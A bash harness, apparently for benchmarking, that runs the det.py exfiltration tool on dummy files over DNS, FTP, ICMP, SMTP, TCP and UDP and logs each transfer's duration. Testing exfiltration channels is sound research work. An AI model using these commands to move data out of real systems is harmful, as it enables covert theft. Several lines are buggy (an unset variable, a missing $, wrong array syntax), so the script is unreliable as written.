#!/usr/bin/env bash

if [ "$(whoami)" != "root" ]
then
    echo "run as ROOT"
    exit
fi


SLEEP_TIME_IN_GROUP=1
SLEEP_TIME_BETWEEN_GROUPS=5

declare -a PROTOCOLS=("dns" "ftp" "icmp" "smtp" "tcp" "udp")
declare -a FILENAMES=("./exfiltrated-tiny.json" "./exfiltrated-small.pdf" "./exfiltrated-medium.doc" "./exfiltrated-big.jpg")
declare -a STATIC_SLEEP_TIMES=(1000 10 10 10)

TIMING_FILE="time_required_${date}.txt"

touch TIMING_FILE

for i in 0 1 2 3
do
    echo "Exfiltrate $FILENAMES[$i] with all protocols."

    for protocol in "${PROTOCOLS[@]}"
    do

        START=$(date +%s.%N)

        FILENAME="${FILENAMES[$i]}.${protocol}"

        cp ${FILENAMES[$i]} $FILENAME
        echo "run following command"
        echo "python2 det.py -p $protocol -c ./config.json -f $FILENAME -S $STATIC_SLEEP_TIME"
        python2 det.py -p $protocol -c ./config.json -f $FILENAME -S ${STATIC_SLEEP_TIMES[$i]}

        END=$(date +%s.%N)
        DIFF=$(echo "$END - $START" | bc)
        rm $FILENAME

        # Document consumed Time
        echo $protocol >> $TIMING_FILE
        echo $FILENAME >> $TIMING_FILE
        echo $DIFF >> $TIMING_FILE
        echo "" >> $TIMING_FILE
        echo "" >> $TIMING_FILE

        echo "$protocol finished"
        echo "Wait $SLEEP_TIME_IN_GROUP ms, then start next protocol"
        echo ""
        echo ""
        sleep $SLEEP_TIME_IN_GROUP

    done

    echo "$FILENAMES[$i] finished"
    echo "Wait $SLEEP_TIME_BETWEEN_GROUPS ms, then start next file"
    echo ""
    echo ""
    echo ""
    echo ""
    sleep $SLEEP_TIME_BETWEEN_GROUPS

done
